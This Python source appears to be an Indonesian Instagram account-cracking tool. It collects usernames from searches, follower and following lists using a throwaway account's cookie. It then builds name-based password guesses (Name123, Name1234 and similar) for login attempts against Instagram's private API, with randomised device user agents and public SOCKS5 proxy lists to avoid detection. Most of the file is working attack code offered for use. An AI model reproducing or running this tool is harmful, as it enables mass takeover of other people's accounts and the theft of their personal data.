SKY     = "#87afff" # SKY BLUE
ORNG   = "#d78700" # ORANGE3
ORCH   = "#ff5fff" # MEDIUM ORCH

#------------------[ RANDOM RICH ]-------------------#
DIT      = random.choice([M2,K2,H2,B2,N2])
TYA     = random.choice ([LIGHT,GOLD,MEDIUM,PINK,SKY,ORNG,ORCH])
ADTYA1 = random.choice([L1,G1,M1,P1,S1,O1,O1])
ADTYA2 = random.choice([H,K,O,B])

#------------------[ WARNA ]-------------------#
try:
	color_rich = open("data/color_rich.txt","r").read()
except FileNotFoundError:
	color_rich = "[#afafff]"
try:
	color_table = open("data/color_table.txt","r").read()
except FileNotFoundError:
	color_table = "#afafff"

#------------------[ USER-AGENT ]-------------------#
USN = "Mozilla/5.0 (Linux; Android 9; FIG-LX1 Build/HUAWEIFIG-L11; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 Instagram 240.2.0.18.107 Android (28 /9; 480dpi; 1080x2032; HUAWEI; FIG-LX1; HWFIG-H; hi6250; it_IT; 378116740)"

def BrayennnXD():
    rr = random.randint
    a1 = random.choice(['SM-G532F','SM-V417I','SM-J400F','SM-T733','SM-F926B'])
    a2 = random.choice(['CPH2059','CPH2001','CPH1909','CPH2269','CPH1729'])
    p1 = f"Mozilla/5.0 (Linux; Android {str(rr(11,19))}; {a1} Build/PPR1.{str(rr(111111,210000))}.0{str(rr(11,19))}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    p2 = f"Mozilla/5.0 (Linux; Android {str(rr(11,19))}; {a2} Build/SP1A.{str(rr(111111,210000))}.0{str(rr(11,19))}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    UaMainn = random.choice([p1, p2])
    batam.append(UaMainn)

for x in range(1000):
    rr = random.randint
    rc = random.choice
    g1 = random.choice(['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19'])
    g2 = random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
    u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-A405FN Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J610G Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u3 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-G610M Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u4 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; CPH2109 Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u5 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J120H Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u6 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-M317F Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    Ua = random.choice([u1, u2, u3, u4, u5, u6])
    UserBrayCrack.append(Ua)

#------------------[ URL-PROXY ]-------------------#
try:
    url_proxy = random.choice([
              "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt", 
              "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt", 
              "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt", 
              "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt", 
              "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt", 
              "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks5.txt", 
              ])
except:pass
   
#------------------[ PROXIES ]-------------------#
try:
    url = requests.get(f"{url_proxy}").text
    for brayen in url.splitlines():proxxy.append(brayen)
except requests.exceptions.ConnectionError:
   os.system("clear")
   prints(Panel(f"{P2}     Anda Tidak Terhubung Ke Internet, Silahkan Periksa Koneksi Internet Anda",width=90,padding=(0,2),style=f"bold white"));sleep(3);exit()

#------------------[ GET-IP ]-------------------#
url = requests.get("http://ip-api.com/json/").json()
try:
	IP  = url["query"]
	CN = url["country"]
except KeyError:
	IP = "-"
	CN = "-"
    
#------------------[ WAKTU ]-------------------#
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Selamat Pagi"
	elif 12 <= hours < 15:timenow = "Selamat Siang"
	elif 15 <= hours < 18:timenow = "Selamat Petang"
	else:timenow = "Selamat Malam"
	return timenow

#------------------[ CLEAR-LAYAR ]-------------------#
def clear():
    try:os.system("clear")
    except:pass

#------------------[ PYTHON VERSION ]-------------------#
try:
    # python 2
	urllib_quote_plus = urllib.quote
except:
    # python 3
	urllib_quote_plus = urllib.parse.quote_plus

#------------------[ URL LOGIN ]-------------------#
def cekAPI(cookie):
    user=open('data/.username','r').read()
    try:
        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':cookie},headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
        i=c.json()["data"]["user"]
        nama=i["full_name"]
        followers=i["edge_followed_by"]["count"]
        following=i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except  (ValueError,KeyError):
        prints(Panel(f"{P2}Opshh Akun Tumbal Mu Terkena Checkpoint, Silahkan Login Dengan Akun Lain",width=90,style=f"bold white"));os.system('rm -rf data/.kukis.log rm -rf data/.username');exit()
    return external,user

#------------------[ LOGIN COOKIES ]-------------------#
def loginCookie():
    if "sukses" in lisensiku:
        try:
            kuki=open('data/.kukis.log','r').read()
        except FileNotFoundError:
            prints(Panel(f"{P2}Sebelum Login Pastikan Akun Tumbal Bersifat Publik Dan Tidak Private",width=90,padding=(0,4),style=f"bold white"))
            us=input(f' [+] {H}Masukan Username :{H} ')
            cok=input(f'{P} [+] {H}Masukan Cookie   :{H} ')
            kuki=open('data/.kukis.log','w').write(cok)
            user=open('data/.username','w').write(us)
            time.sleep(6)
            prints(Panel(f"{P2}Login Akun Tumbal Berhasil, Silahkan Jalankan Ulang Scriptnya",width=90,padding=(0,7),style=f"bold white"));exit()
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()
    else:
        lisensi()

class instagramAPI:
	API_URL = 'https://i.instagram.com/api/v1/'
	DEVICE_SETTINTS = {'manufacturer': 'Xiaomi',
		'model': 'HM 1SW',
		'android_version': 18,
		'android_release': '4.3'}
	USER_AGENT = 'Instagram 10.26.0 Android ({android_version}/{android_release}; 320dpi; 720x1280; {manufacturer}; {model}; armani; qcom; en_US)'.format(**DEVICE_SETTINTS)
	IG_SIG_KEY = '4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'
	EXPERIMENTS = 'ig_promote_reach_objective_fix_universe,ig_android_universe_video_production,ig_search_client_h1_2017_holdout,ig_android_live_follow_from_comments_universe,ig_android_carousel_non_square_creation,ig_android_live_analytics,ig_android_follow_all_dialog_confirmation_copy,ig_android_stories_server_coverframe,ig_android_video_captions_universe,ig_android_offline_location_feed,ig_android_direct_inbox_retry_seen_state,ig_android_ontact_invite_universe,ig_android_live_broadcast_blacklist,ig_android_insta_video_reconnect_viewers,ig_android_ad_async_ads_universe,ig_android_search_clear_layout_universe,ig_android_shopping_reporting,ig_android_stories_surface_universe,ig_android_verified_comments_universe,ig_android_preload_media_ahead_in_current_reel,android_instagram_prefetch_suggestions_universe,ig_android_reel_viewer_fetch_missing_reels_universe,ig_android_direct_search_share_sheet_universe,ig_android_business_promote_tooltip,ig_android_direct_blue_tab,ig_android_async_network_tweak_universe,ig_android_elevate_main_thread_priority_universe,ig_android_stories_gallery_nux,ig_android_instavideo_remove_nux_comments,ig_video_copyright_whitelist,ig_react_native_inline_insights_with_relay,ig_android_direct_thread_message_animation,ig_android_draw_rainbow_client_universe,ig_android_direct_link_style,ig_android_live_heart_enhancements_universe,ig_android_rtc_reshare,ig_android_preload_item_count_in_reel_viewer_buffer,ig_android_users_bootstrap_service,ig_android_auto_retry_post_mode,ig_android_shopping,ig_android_main_feed_seen_state_dont_send_info_on_tail_load,ig_fbns_preload_default,ig_android_gesture_dismiss_reel_viewer,ig_android_tool_tip,ig_android_ad_logger_funnel_logging_universe,ig_android_gallery_grid_column_count_universe,ig_android_business_new_ads_payment_universe,ig_android_direct_links,ig_android_audience_control,ig_android_live_encore_consumption_settings_universe,ig_perf_android_holdout,ig_android_cache_contact_import_list,ig_android_links_receivers,ig_android_ad_impression_backtest,ig_android_list_redesign,ig_android_stories_separate_overlay_creation,ig_android_stop_video_recording_fix_universe,ig_android_render_video_segmentation,ig_android_live_encore_reel_chaining_universe,ig_android_sync_on_background_enhanced_10_25,ig_android_immersive_viewer,ig_android_mqtt_skywalker,ig_fbns_push,ig_android_ad_watchmore_overlay_universe,ig_android_react_native_universe,ig_android_profile_tabs_redesign_universe,ig_android_live_consumption_abr,ig_android_story_viewer_social_context,ig_android_hide_post_in_feed,ig_android_video_loopcount_int,ig_android_enable_main_feed_reel_tray_preloading,ig_android_camera_upsell_dialog,ig_android_ad_watchbrowse_universe,ig_android_internal_research_settings,ig_android_search_people_tag_universe,ig_android_react_native_ota,ig_android_enable_concurrent_request,ig_android_react_native_stories_grid_view,ig_android_business_stories_inline_insights,ig_android_log_mediacodec_info,ig_android_direct_expiring_media_loading_errors,ig_video_use_sve_universe,ig_android_cold_start_feed_request,ig_android_enable_zero_rating,ig_android_reverse_audio,ig_android_branded_content_three_line_ui_universe,ig_android_live_encore_production_universe,ig_stories_music_sticker,ig_android_stories_teach_gallery_location,ig_android_http_stack_experiment_2017,ig_android_stories_device_tilt,ig_android_pending_request_search_bar,ig_android_fb_topsearch_sgp_fork_request,ig_android_seen_state_with_view_info,ig_android_animation_perf_reporter_timeout,ig_android_new_block_flow,ig_android_story_tray_title_play_all_v2,ig_android_direct_address_links,ig_android_stories_archive_universe,ig_android_save_collections_cover_photo,ig_android_live_webrtc_livewith_production,ig_android_sign_video_url,ig_android_stories_video_prefetch_kb,ig_android_stories_create_flow_favorites_tooltip,ig_android_live_stop_broadcast_on_404,ig_android_live_viewer_invite_universe,ig_android_promotion_feedback_channel,ig_android_render_iframe_interval,ig_android_accessibility_logging_universe,ig_android_camera_shortcut_universe,ig_android_use_one_cookie_store_per_user_override,ig_profile_holdout_2017_universe,ig_android_stories_server_brushes,ig_android_ad_media_url_logging_universe,ig_android_shopping_tag_nux_text_universe,ig_android_comments_single_reply_universe,ig_android_stories_video_loading_spinner_improvements,ig_android_collections_cache,ig_android_comment_api_spam_universe,ig_android_facebook_twitter_profile_photos,ig_android_shopping_tag_creation_universe,ig_story_camera_reverse_video_experiment,ig_android_direct_bump_selected_recipients,ig_android_ad_cta_haptic_feedback_universe,ig_android_vertical_share_sheet_experiment,ig_android_family_bridge_share,ig_android_search,ig_android_insta_video_consumption_titles,ig_android_stories_gallery_preview_button,ig_android_fb_auth_education,ig_android_camera_universe,ig_android_me_only_universe,ig_android_instavideo_audio_only_mode,ig_android_user_profile_chaining_icon,ig_android_live_video_reactions_consumption_universe,ig_android_stories_hashtag_text,ig_android_post_live_badge_universe,ig_android_swipe_fragment_container,ig_android_search_users_universe,ig_android_live_save_to_camera_roll_universe,ig_creation_growth_holdout,ig_android_sticker_region_tracking,ig_android_unified_inbox,ig_android_live_new_watch_time,ig_android_offline_main_feed_10_11,ig_import_biz_contact_to_page,ig_android_live_encore_consumption_universe,ig_android_experimental_filters,ig_android_search_client_matching_2,ig_android_react_native_inline_insights_v2,ig_android_business_conversion_value_prop_v2,ig_android_redirect_to_low_latency_universe,ig_android_ad_show_new_awr_universe,ig_family_bridges_holdout_universe,ig_android_background_explore_fetch,ig_android_following_follower_social_context,ig_android_video_keep_screen_on,ig_android_ad_leadgen_relay_modern,ig_android_profile_photo_as_media,ig_android_insta_video_consumption_infra,ig_android_ad_watchlead_universe,ig_android_direct_prefetch_direct_story_json,ig_android_shopping_react_native,ig_android_top_live_profile_pics_universe,ig_android_direct_phone_number_links,ig_android_stories_weblink_creation,ig_android_direct_search_new_thread_universe,ig_android_histogram_reporter,ig_android_direct_on_profile_universe,ig_android_network_cancellation,ig_android_background_reel_fetch,ig_android_react_native_insights,ig_android_insta_video_audio_encoder,ig_android_family_bridge_bookmarks,ig_android_data_usage_network_layer,ig_android_universal_instagram_deep_links,ig_android_dash_for_vod_universe,ig_android_modular_tab_discover_people_redesign,ig_android_mas_sticker_upsell_dialog_universe,ig_android_ad_add_per_event_counter_to_logging_event,ig_android_sticky_header_top_chrome_optimization,ig_android_rtl,ig_android_biz_conversion_page_pre_select,ig_android_promote_from_profile_button,ig_android_live_broadcaster_invite_universe,ig_android_share_spinner,ig_android_text_action,ig_android_own_reel_title_universe,ig_promotions_unit_in_insights_landing_page,ig_android_business_settings_header_univ,ig_android_save_longpress_tooltip,ig_android_constrain_image_size_universe,ig_android_business_new_graphql_endpoint_universe,ig_ranking_following,ig_android_stories_profile_camera_entry_point,ig_android_universe_reel_video_production,ig_android_power_metrics,ig_android_sfplt,ig_android_offline_hashtag_feed,ig_android_live_skin_smooth,ig_android_direct_inbox_search,ig_android_stories_posting_offline_ui,ig_android_sidecar_video_upload_universe,ig_android_promotion_manager_entry_point_universe,ig_android_direct_reply_audience_upgrade,ig_android_swipe_navigation_x_angle_universe,ig_android_offline_mode_holdout,ig_android_live_send_user_location,ig_android_direct_fetch_before_push_notif,ig_android_non_square_first,ig_android_insta_video_drawing,ig_android_swipeablefilters_universe,ig_android_live_notification_control_universe,ig_android_analytics_logger_running_background_universe,ig_android_save_all,ig_android_reel_viewer_data_buffer_size,ig_direct_quality_holdout_universe,ig_android_family_bridge_discover,ig_android_react_native_restart_after_error_universe,ig_android_startup_manager,ig_story_tray_peek_content_universe,ig_android_profile,ig_android_high_res_upload_2,ig_android_http_service_same_thread,ig_android_scroll_to_dismiss_keyboard,ig_android_remove_followers_universe,ig_android_skip_video_render,ig_android_story_timestamps,ig_android_live_viewer_comment_prompt_universe,ig_profile_holdout_universe,ig_android_react_native_insights_grid_view,ig_stories_selfie_sticker,ig_android_stories_reply_composer_redesign,ig_android_streamline_page_creation,ig_explore_netego,ig_android_ig4b_connect_fb_button_universe,ig_android_feed_util_rect_optimization,ig_android_rendering_controls,ig_android_os_version_blocking,ig_android_encoder_width_safe_multiple_16,ig_search_new_bootstrap_holdout_universe,ig_android_snippets_profile_nux,ig_android_e2e_optimization_universe,ig_android_comments_logging_universe,ig_shopping_insights,ig_android_save_collections,ig_android_live_see_fewer_videos_like_this_universe,ig_android_show_new_contact_import_dialog,ig_android_live_view_profile_from_comments_universe,ig_fbns_blocked,ig_formats_and_feedbacks_holdout_universe,ig_android_reduce_view_pager_buffer,ig_android_instavideo_periodic_notif,ig_search_user_auto_complete_cache_sync_ttl,ig_android_marauder_update_frequency,ig_android_suggest_password_reset_on_oneclick_login,ig_android_promotion_entry_from_ads_manager_universe,ig_android_live_special_codec_size_list,ig_android_enable_share_to_messenger,ig_android_background_main_feed_fetch,ig_android_live_video_reactions_creation_universe,ig_android_channels_home,ig_android_sidecar_gallery_universe,ig_android_upload_reliability_universe,ig_migrate_mediav2_universe,ig_android_insta_video_broadcaster_infra_perf,ig_android_business_conversion_social_context,android_ig_fbns_kill_switch,ig_android_live_webrtc_livewith_consumption,ig_android_destroy_swipe_fragment,ig_android_react_native_universe_kill_switch,ig_android_stories_book_universe,ig_android_all_videoplayback_persisting_sound,ig_android_draw_eraser_universe,ig_direct_search_new_bootstrap_holdout_universe,ig_android_cache_layer_bytes_threshold,ig_android_search_hash_tag_and_username_universe,ig_android_business_promotion,ig_android_direct_search_recipients_controller_universe,ig_android_ad_show_full_name_universe,ig_android_anrwatchdog,ig_android_qp_kill_switch,ig_android_2fac,ig_direct_bypass_group_size_limit_universe,ig_android_promote_simplified_flow,ig_android_share_to_whatsapp,ig_android_hide_bottom_nav_bar_on_discover_people,ig_fbns_dump_ids,ig_android_hands_free_before_reverse,ig_android_skywalker_live_event_start_end,ig_android_live_join_comment_ui_change,ig_android_direct_search_story_recipients_universe,ig_android_direct_full_size_gallery_upload,ig_android_ad_browser_gesture_control,ig_channel_server_experiments,ig_android_video_cover_frame_from_original_as_fallback,ig_android_ad_watchinstall_universe,ig_android_ad_viewability_logging_universe,ig_android_new_optic,ig_android_direct_visual_replies,ig_android_stories_search_reel_mentions_universe,ig_android_threaded_comments_universe,ig_android_mark_reel_seen_on_Swipe_forward,ig_internal_ui_for_lazy_loaded_modules_experiment,ig_fbns_shared,ig_android_capture_slowmo_mode,ig_android_live_viewers_list_search_bar,ig_android_video_single_surface,ig_android_offline_reel_feed,ig_android_video_download_logging,ig_android_last_edits,ig_android_exoplayer_4142,ig_android_post_live_viewer_count_privacy_universe,ig_android_activity_feed_click_state,ig_android_snippets_haptic_feedback,ig_android_gl_drawing_marks_after_undo_backing,ig_android_mark_seen_state_on_viewed_impression,ig_android_live_backgrounded_reminder_universe,ig_android_live_hide_viewer_nux_universe,ig_android_live_monotonic_pts,ig_android_search_top_search_surface_universe,ig_android_user_detail_endpoint,ig_android_location_media_count_exp_ig,ig_android_comment_tweaks_universe,ig_android_ad_watchmore_entry_point_universe,ig_android_top_live_notification_universe,ig_android_add_to_last_post,ig_save_insights,ig_android_live_enhanced_end_screen_universe,ig_android_ad_add_counter_to_logging_event,ig_android_blue_token_conversion_universe,ig_android_exoplayer_settings,ig_android_progressive_jpeg,ig_android_offline_story_stickers,ig_android_gqls_typing_indicator,ig_android_chaining_button_tooltip,ig_android_video_prefetch_for_connectivity_type,ig_android_use_exo_cache_for_progressive,ig_android_samsung_app_badging,ig_android_ad_holdout_watchandmore_universe,ig_android_offline_commenting,ig_direct_stories_recipient_picker_button,ig_insights_feedback_channel_universe,ig_android_insta_video_abr_resize,ig_android_insta_video_sound_always_on'''
	SIG_KEY_VERSION = '4'

	def __init__(self,username,password):
		self.username=username
		self.password=password
		m = hashlib.md5()
		m.update(username.encode('utf-8') + password.encode('utf-8'))
		self.device_id = self.generateDeviceId(m.hexdigest())
		self.uuid = self.generateUUID(True)
		self.s = requests.Session()

	def generateDeviceId(self, seed):
		volatile_seed = "12345"
		m = hashlib.md5()
		m.update(seed.encode('utf-8') + volatile_seed.encode('utf-8'))
		return 'android-' + m.hexdigest()[:16]

	def generateUUID(self, type):
		generated_uuid = str(uuid.uuid4())
		if (type):
			return generated_uuid
		else:
			return generated_uuid.replace('-', '')

	def loginAPI(self):
		token=self.s.get("https://i.instagram.com/",headers={"user-agent":USN}).text
		crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
		self.s.headers.update({'Connection': 'close',
			'Accept': '*/*',
			'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'Cookie2': '$Version=1',
			'Accept-Language': 'en-US',
			'User-Agent': USN})
		self.data = json.dumps({
			'phone_id': self.generateUUID(True),
			'_csrftoken': crf_token,
			'username': self.username,
			'guid': self.uuid,
			'device_id': self.device_id,
			'password': self.password,
			'login_attempt_count': '0'})
		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(False),
			urllib.request.quote(self.data)
		)
		x=self.s.post("https://i.instagram.com/api/v1/accounts/login/", self.payload)
		x_jason=json.loads(x.text)
		x_kukis=x.cookies.get_dict()
		if "logged_in_user" in x.text:
			kuki=";".join([v+"="+x_kukis[v] for v in x_kukis])
			#id=x_jason['logged_in_user']['pk']
			#nm=x_jason['logged_in_user']['full_name']
			#pn=x_jason['logged_in_user']['phone_number']
			return {'status':'success','cookie':kuki,'userame':self.username}
		elif 'challenge_required' in x.text:
			return {'status':'checkpoint'}
		else:
			return {'status':'login_error'}
C = ''

#------------------[ MENU TOOLS ]-------------------#
class instagram:
	def __init__(self,external,username,cookie):
		self.ext=external
		self.username=username
		self.cookie=cookie
		self.s=requests.Session()
	def logo(self):
		for i in external:
			try:
				nama=i.split('|')[0]
				followers=i.split('|')[1]
				following=i.split('|')[2]
			except:
				pass
			BrayGagah.append(Panel(f"{P2}nama      : {H2}{nama}\n{P2}username  : {H2}{self.username}",width=45,padding=(0,2),style=f"bold white"))
			BrayGagah.append(Panel(f"{P2}pengikut  : {H2}{followers}\n{P2}mengikuti : {H2}{following}",width=45,padding=(0,2),style=f"bold white"))
			console.print(Columns(BrayGagah))
			prints(Panel(f"{P2}Selamat Datang {H2}{nama} {P2}Gunakan Tools Dengan Bijak :)",width=90,padding=(0,9),style=f"bold white"))
			prints(Panel(f"{P2}[[bold cyan]01{P2}]. Dump Id Pencarian Nama       {P2}[[bold cyan]05{P2}]. Lihat Hasil Crack\n{P2}[[bold cyan]02{P2}]. Dump Id Pengikut             {P2}[[bold cyan]06{P2}]. Bot Auto Unfollow\n{P2}[[bold cyan]03{P2}]. Dump Id Mengikuti            {P2}[[bold cyan]07{P2}]. Report Bug Script\n{P2}[[bold cyan]04{P2}]. Crack Ulang Hasil Cp         {P2}[[bold cyan]00{P2}]. Keluar Tools",width=90,padding=(0,4),style=f"bold white"))

			
	def hapus_lisensi(self):
		ask = input(f" [+] Apakah Anda Yakin Ingin Menghapus Lisensi? Y/t : ")
		if ask in ["y","Y"]:os.system("rm -rf data/lisensi.txt");prints(Panel(f"{P2}Succeed Menghapus {color_rich}'Lisensi'{P2} Terima Kasih Telah Menggunakan Script Brayennn-Prem",width=90,style=f"bold white"));time.sleep(2);exit()
		elif ask in ["t","T"]:self.menu()
		else:self.hapus_lisensi()

	def Exit(self):
		x=input(f" [+] Apakah Anda Yakin Ingin Keluar? Y/t : ")
		if x in ["y","Y"]:os.system("rm -rf data/.kukis.log rm -rf data/.username");prints(Panel(f"{P2}Succeed Menghapus {color_rich}'Cookie' {P2}Terima Kasih Telah Menggunakan Script BrayenInsta",width=90,padding=(0,2),style=f"bold white"));time.sleep(2);exit()
		elif x in ["t","T"]:self.menu() 
		else:self.menu()

	def sixAPI(self,six_id):
		url = "https://i.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
		x = requests.get(url)
		x_jason = x.json()
		uid = str( x_jason['users'][0].get("user").get("pk") )
		return uid

	def unfollowAPI(self,user_id,username_id,cookie):
		uuid=self.generateUUID(True)
		xx=self.s.get("https://i.instagram.com/",headers={"user-agent":USN}).content
		crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
		s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': USN})

		data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': crf_token})

		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(False),
			urllib.request.quote(data))
		return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text


	def searchAPI(self,cookie,nama):
		try:
			x=s.get('https://i.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
			x_jason=json.loads(x.text)
			for i in x_jason['users']:
				user=i['user']
				username=user['username']
				fullname=user['full_name']
				internal.append(f'{username}|{fullname}')
		except requests.exceptions.ConnectionError:
			prints(Panel(f'{P2}koneksi internet anda bermasalah silahkan cek dan coba lagi masuk ke tools',width=90,style=f"bold white"));time.sleep(3);exit()
		return internal

	def idAPI(self,cookie,id):
		if 'sukses' in lisensiku:
			try:
				m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
				m_jason=m.json()["data"]["user"]
				idx=m_jason["id"]
			except requests.exceptions.ConnectionError:
				prints(Panel(f'{P2}koneksi internet anda bermasalah silahkan cek dan coba lagi masuk ke tools',width=90,style=f"bold white"));time.sleep(3);exit()
			except Exception as e:
				prints(Panel(f'{P2}Username Yang Anda Masukan Tidak Di Temukan Atau Akun Private',width=90,padding=(0,7),style=f"bold white"));exit()
			return idx
		else:lisensi()
   
   	
	def ingfo(self,cookie):
		try:
			link = s.get(f"https://i.instagram.com/api/v1/accounts/edit/web_form_data/", headers={"user-agent":USN},cookies={"cookie":cookie}).json()["form_data"]
			nomor = link["phone_number"].replace("-", "").replace(" ", "")
			tggl = link["birthday"]
			year, month, day = tggl.split("-")
			month = bulan_ttl[month]
			tanggal = (f"{day} {month} {year}")
		except:
			nomor = "-"
			tanggal = "-"
		return nomor, tanggal
	
	def infoAPI(self,cookie,api,id):
		if 'sukses' in  lisensiku:
			try:
				x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				for i in x_jason['users']:
					username = i["username"]
					nama = i["full_name"]
					internal.append(f'{username}|{nama}')
					following.append(username)
				if 'pengikut' in menudump:
					maxid=x_jason['next_max_id']
					for z in range (9999):
						x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
								nama = i["full_name"]
								internal.append(f'{username}|{nama}')
								following.append(username)
							try:
								maxid=x_jason['next_max_id']
							except:
								break
						except:
							if 'challenge' in x.text:
								break
							else:
								continue
				else:pass
			except requests.exceptions.ConnectionError:
				prints(Panel(f'{P2}Koneksi Internet Anda Bermasalah Silahkan Cek Dan Coba Lagi Masuk Ke Tools',width=90,style=f"bold white"));time.sleep(3);exit()
			except Exception as e:
				prints(Panel(f'{P2}Username Yang Anda Masukan Tidak Di Temukan Atau Akun Private',width=90,padding=(0,7),style=f"bold white"));exit()
			return internal
		else:lisensi()
		
	def ifoAPI(self,cookie,api,id):
		if 'sukses' in  lisensiku:
			try:
				x=s.get(api%(id),cookies=cookie,headers={"user-agent":BrayennnXD()})
				x_jason=json.loads(x.text)
				for i in x_jason['users']:
					username = i["username"]
					nama = i["full_name"]
					internal.append(f'{username}|{nama}')
					following.append(username)
				if 'mengikuti' in menudump:
					maxid=x_jason['next_max_id']
					for z in range (9999):
						x=s.get('https://www.instagram.com/api/v1/friendships/'+id+'/following/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":BrayennnXD()})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
								nama = i["full_name"]
								internal.append(f'{username}|{nama}')
								following.append(username)
							try:
								maxid=x_jason['next_max_id']
							except:
								break
						except:
							if 'challenge' in x.text:
								break
							else:
								continue
				else:pass
			except requests.exceptions.ConnectionError:
				prints(Panel(f'{P2}Koneksi Internet Anda Bermasalah Silahkan Cek Dan Coba Lagi Masuk Ke Tools',width=90,style=f"bold white"));time.sleep(3);exit()
			except Exception as e:
				prints(Panel(f'{P2}Username Yang Anda Masukan Tidak Di Temukan Atau Akun Private',width=90,padding=(0,7),style=f"bold white"));exit()
			return internal
		else:lisensi()
		
#------------------[ PILIH METODE AND PASSWORD ]-------------------#
	def ifo(self):
		urut = []
		urut.append(Panel(f"{P2}[[bold cyan]01{P2}] Methode API ",padding=(0,11),style=f"bold white"))
		urut.append(Panel(f"{P2}[[bold cyan]02{P2}] Methode AJAX",padding=(0,11),style=f"bold white"))
		console.print(Columns(urut))
		
	def passwordAPI(self,xnx):
		prints(Panel(f"{P2}   Total Username Terkumpul : {color_rich}{len(internal)}",width=90,padding=(0,20),style=f"bold white"))
		self.ifo()
		u = input(f' [+] Pilih Metode: ')
		if u in ["1","01"]:
			method.append('satu')
		elif u in ["2","02"]:
			method.append('dua')
		else:
			method.append('satu')
		prints(Panel(f"{P2}[[bold cyan]01{P2}] Name,Name123,Name1234\n[[bold cyan]02{P2}] Name,Name123,Name1234,Name12345\n[[bold cyan]03{P2}] Name,Name123,Name1234,Name12345,Name123456\n[[bold cyan]04{P2}] Name,Name12,Name123,Name1234,Name12345,Name123456\n[[bold cyan]05{P2}] Password Manual",width=90,padding=(0,3),title='List Password',style=f"bold white"))
		c=input(f'{N} [+] Masukan Pilihan :{C} ')
		if c in ['1','01']:
			self.generateAPI(xnx,c)
		elif c in ['2','02']:
			self.generateAPI(xnx,c)
		elif c in ['3','03']:
			self.generateAPI(xnx,c)
		elif c in ['4','04']:
			self.generateAPI(xnx,c)
		elif c in ['5','05']:
			prints(Panel(f"{P2}Masukan Password Manual Minimal Password 6 Karakter Jangan Sampe Kurang\nContoh Password : Indonesia,Bengkulu123,Papua1234",width=90,style=f"bold white"))
